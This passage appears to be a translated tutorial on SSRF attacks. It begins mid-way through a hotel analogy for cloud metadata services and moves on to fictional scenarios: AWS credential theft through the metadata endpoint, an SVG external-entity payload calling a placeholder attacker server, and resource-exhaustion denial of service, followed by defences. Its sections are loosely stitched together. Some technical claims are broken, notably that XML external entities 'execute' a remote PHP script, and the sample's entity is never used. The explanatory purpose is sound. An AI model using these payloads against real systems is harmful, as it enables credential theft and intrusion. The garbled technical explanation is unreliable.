3. **Room self-adaptation**: After entering the room, the smart temperature control system in the room automatically adjusts the temperature to 22°C; the smart speaker, in its welcome message, informs him that the 7:00 AM wake-up service has been set according to his preferences, and asks whether he would like soft background music to be played immediately to help him relax.

4. **Personalized service**: The next morning, Zhang Wei selects a breakfast menu on the smart screen in the room; based on his historical order records and preferences, the system recommends a breakfast combo containing a latte and automatically notifies the kitchen to prepare it.

5. **Check-out settlement**: When checking out, the metadata service automatically aggregates all the services and consumption details Zhang Wei used in the hotel, including minibar consumption, additional laundry services, etc., directly generates the bill, and sends it to him by email, simplifying the checkout process.

In this example, the metadata service is like the hotel's nervous system, collecting, organizing, and applying various information about Zhang Wei to ensure he receives a personalized service experience, while also improving the hotel's operational efficiency and customer satisfaction. This intelligent service model demonstrates the metadata service's ability to understand and respond to individual needs.
Let's use a concrete example to illustrate this process, in order to understand this concept more intuitively.

### Scenario Background

Suppose there is a company called "Smart Cloud Link" that uses a major cloud service provider to host its business applications. One of Smart Cloud Link's key applications runs on a cloud server instance that handles core functions such as processing customer orders and managing database access. The cloud service provider provides a metadata service for this instance, used to store necessary configuration information and security credentials, such as the AWS access key ID and secret access key, which the application needs to connect to other AWS services (such as S3 buckets or DynamoDB databases).

### Metadata Service Access

When Smart Cloud Link's application initializes, it usually needs to obtain these credentials from the metadata service. According to the cloud service provider's design, the application can directly initiate a request to the internal IP address HTTP://169.254.169.254/ to obtain the current instance's authentication information and configuration details. This is a standard and convenient mechanism designed to simplify the deployment and management of cloud applications.

### Attack Process

1. **Discovering the vulnerability**: An attacker discovers the SSRF vulnerability in Smart Cloud Link's application through network scanning or social engineering methods.
   
2. **Constructing the request**: Exploiting this vulnerability, the attacker sends a request to the application that contains a URL pointing to the internal metadata service (HTTP://169.254.169.254/latest/meta-data/iam/security-credentials/default-role).
   
3. **Obtaining credentials**: Due to the SSRF vulnerability, the server mistakenly executes this request and returns the response data containing the AWS access key ID and secret access key to the attacker.

4. **Controlling cloud resources**: Using the stolen credentials, the attacker can act freely under Smart Cloud Link's AWS account, such as creating new high-privilege users, launching large numbers of expensive EC2 instances, downloading or tampering with data in S3 buckets, or even deploying malware, causing Smart Cloud Link to suffer financial losses and brand reputation damage.

### Security Challenges and Countermeasures

This case demonstrates the unique security challenges in cloud environments, particularly how to prevent unauthorized access to internal metadata services. To address this challenge:

- **Strengthen input validation**: During application development, strictly validate and filter all external input to avoid SSRF attacks.
- **Use API gateways and firewall rules**: Configure network policies to block unexpected requests from external sources from accessing internal metadata services.
- **Regular security audits**: Conduct regular security checks and penetration testing to promptly discover and fix potential security vulnerabilities.
- **Principle of least privilege**: Assign access keys with the minimum necessary permissions to cloud services, so that even if credentials are leaked, the extent of damage can be limited.
- **Monitoring and alerts**: Implement real-time monitoring and alert systems to respond quickly to abnormal access patterns.

Through the above measures, enterprises can significantly reduce the risk of metadata services being illegally accessed due to SSRF vulnerabilities and protect the security of their cloud resources.
### Scenario 4: Penetrating Internal Services

Once attackers gain initial access to internal services through SSRF, they may attempt further attacks, such as remote code execution (RCE) or distributed denial of service attacks (DDoS). RCE allows attackers to execute arbitrary commands on the target server and completely control it; while using internal services to carry out DoS attacks may paralyze critical systems or services by consuming resources or exploiting unauthorized access permissions, causing business interruption. These deeper attacks are often based on the initial SSRF vulnerability exploitation, highlighting the importance of protecting applications from SSRF.
Let's explain this process through a fictional but concrete scenario:

### Scenario Setup

Imagine a technology company called "Security Pioneer" that operates an online file-sharing platform allowing users to upload documents and generate preview images for them. The platform uses cloud services and internally deploys an image conversion service, which receives file paths through an internal API (not directly accessible from the public network) and converts them into thumbnails. Unfortunately, the platform has an SSRF vulnerability when processing the URLs of user-uploaded files.

#### Uploading URLs and uploading file content
When the platform processes the URL of a user-uploaded file, it typically involves the following steps:

1. **Receiving the upload request**: When a user uploads a file through the platform's front-end interface or API, a request is sent to the server. This request contains specific information about the file, such as the file name, type, and the actual data content or a URL pointing to the file (if link upload is supported).

2. **Validation and filtering**: The server first validates the upload request, checking whether it comes from a logged-in user, whether the file type complies with regulations (for example, only accepting specific formats such as PDF, DOCX, JPEG, etc.), and whether the file size exceeds limits. In addition, basic security filtering is performed to check whether the file name or content contains malicious code or illegal characters.

3. **Storage processing**: After validation passes, if what the user uploaded is the actual content of the file, the platform saves it to the cloud storage service; if it is a URL, the platform fetches the file content through this URL. In this process, if the platform is poorly designed, an SSRF vulnerability may be exposed—that is, the server directly accesses resources based on the user-provided URL without adequately verifying whether this URL is safe.

4. **Generating previews or thumbnails**: For documents or images, the platform may further process these files to generate preview images or thumbnails, so that users can view the content without downloading the original file. This usually involves calling internal services or third-party APIs, such as the image conversion service mentioned earlier.

5. **Providing access**: After completing the above steps, the platform provides the user with a link through which the user can access the uploaded file and its preview image via the web or in-app interface.

In the case of "Security Pioneer", the problem lies in the platform's failure to correctly verify user-submitted URLs, which allowed attackers to exploit the SSRF vulnerability through carefully crafted URLs, then access internal services, and ultimately use an RCE vulnerability to completely control the server. The correct approach is to implement strict validation mechanisms and access controls, ensuring that only legitimate and safe requests are processed.

### The Initial SSRF Attack

The attacker "Shadow Hunter" discovered this SSRF vulnerability. He can construct a special request that causes "Security Pioneer's" server to access the URL of its internal image conversion service—a URL that should only accept requests from within the platform. Due to the lack of proper validation, the server executed this request, and Shadow Hunter thereby gained initial access to the internal service.

### Further Attack: Remote Code Execution (RCE)

Let's break down this example in detail to understand how the attacker discovered the vulnerability, constructed a malicious file, and ultimately executed arbitrary commands to control the server.

### 1. Discovering the Vulnerability Point

**Background**: The online file-sharing platform run by the "Security Pioneer" company contains an image conversion service used to process user-uploaded images and convert them into formats suitable for preview. This service communicates with the server through an API, accepts an image path as a parameter, and then performs the conversion on the server side.

**Analysis process**:
- Shadow Hunter first conducted a detailed analysis of the API interface of this image conversion service, possibly by reading public documentation, reverse engineering, or directly using API testing tools.
- During the analysis, he noticed differences in how the service handled different image formats. In particular, when processing image formats that can contain XML structures, such as SVG (Scalable Vector Graphics) files, the service did not correctly configure the security settings of the XML parser.
- A particularly dangerous point is that when parsing the XML in SVG files, the service did not disable the loading of external entities. External entities are a feature of XML documents that allow a document to reference external resources. If misconfigured, this can be abused to execute attacker-controlled remote code.

### 2. Constructing the Malicious File

**Malicious SVG file construction**:
- Shadow Hunter used the vulnerability he discovered to construct a special SVG file. In this file, he embedded an external entity declaration pointing to a malicious script on a remote server under his control.
- For example, he added the following code snippet to the SVG file:
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE svg [
    <!ENTITY evilCmd SYSTEM "http://攻击者服务器地址/malicious_script.php">
  ]>
  <svg width="100" height="100">
    <!-- 正常SVG内容 -->
  </svg>
  ```
- When the image conversion service attempts to parse this SVG file, it will follow the external entity declaration to access and execute the "malicious_script.php" script located on the attacker's server.

### 3. Executing Arbitrary Commands

**Attack chain**:
- "malicious_script.php" contains a series of carefully designed instructions intended to exploit the operating system environment of the server where the image conversion service resides.
- Once the server accesses and executes this remote script, the script may:
  - Use operating system command injection to execute arbitrary commands (such as downloading malware, opening backdoors, stealing system information, etc.).
  - Through further vulnerability exploitation, escalate privileges to the system administrator level, thereby completely controlling the server.
- Through this step, Shadow Hunter not only proved that he could execute arbitrary commands but actually took control of "Security Pioneer's" server, paving the way for his subsequent malicious activities (such as data theft, deploying botnet nodes, launching further attacks, etc.).

**Summary**: This example demonstrates how attackers can, step by step, achieve full control of a target server by identifying and exploiting an RCE vulnerability. It underscores how important it is to correctly configure security settings and implement strict input validation when handling user-provided content, especially in scenarios involving file parsing.

### Distributed Denial of Service Attack (DDoS) Using Internal Services
This example describes in detail, in the context of cybersecurity, an attack strategy carried out by exploiting a specific vulnerability (Server-Side Request Forgery, SSRF), and how this attack affects the stability and performance of system services. Below is a further elaboration and simplified example of this scenario:

**Background introduction:**
Suppose there is an online file-sharing platform called "FileSharePlus" that allows users to upload, store, and share various types of files, including images. To improve the user experience, the platform has a built-in image conversion service that can automatically convert uploaded images into formats and sizes suitable for web browsing. Shadow Hunter is a security researcher (or malicious attacker) who discovered two problems while conducting penetration testing on FileSharePlus: one is a remote code execution (RCE) vulnerability, and the other is a performance weakness of the image conversion service.

**Discovering and exploiting the SSRF vulnerability:**
During the analysis, Shadow Hunter discovered that a certain functional module of the platform had an SSRF vulnerability. This means he could use carefully crafted requests to induce FileSharePlus's server to access (or request) any URL he specified. This gave him an opportunity to gain unauthorized access to internal services (such as the image conversion service) or other external systems.

**Attack steps:**
1. **Constructing requests**: Shadow Hunter first prepared a set of specially crafted HTTP requests, each containing a URL pointing to a large-size image (such as a high-resolution photo or a complex vector graphic) or a specially formatted image (a file that may cause the conversion algorithm to be inefficient).
2. **Exploiting SSRF**: Using the discovered SSRF vulnerability, he continuously sent these requests to the FileSharePlus server, but in reality, he was making the server's image conversion service process these images.
3. **Resource exhaustion**: Because each request pointed to a large file requiring substantial computational resources to process, the image conversion service was soon forced to handle a large number of heavy tasks. This caused the server's CPU utilization to surge, memory usage to become excessive, and network bandwidth to be consumed by these frequent requests at the same time.
4. **System paralysis**: As resources were rapidly consumed, the system resources originally used to handle normal user requests became extremely scarce, eventually causing the entire FileSharePlus platform to run slowly, new user requests could not be responded to in a timely manner, and the service might even be completely interrupted.

**Consequences and lessons:**
This attack demonstrates that even without directly executing malicious code (such as RCE), abusing service functions and mismanaging resources can still have a serious impact on the system. For FileSharePlus, this is an important lesson, reminding them of the need to strengthen input validation of services, implement request rate limiting, optimize resource management, and enhance filtering mechanisms for external requests to prevent such attacks from happening again. At the same time, it also highlights the importance of conducting comprehensive security audits and penetration testing to discover and fix potential security vulnerabilities in advance.
### Results and Lessons

Through this example, we can see that an initial SSRF vulnerability can serve as a springboard, allowing attackers to go deep into an enterprise, execute RCE to gain server control, or use internal services to launch DDoS attacks, causing serious business interruption and security threats. This underscores that when designing and maintaining applications, the handling of external input must be strictly controlled, and multi-layered security protections must be implemented, including input validation, access control, resource limits, and continuous security auditing, to prevent such chain-reaction security incidents from occurring.
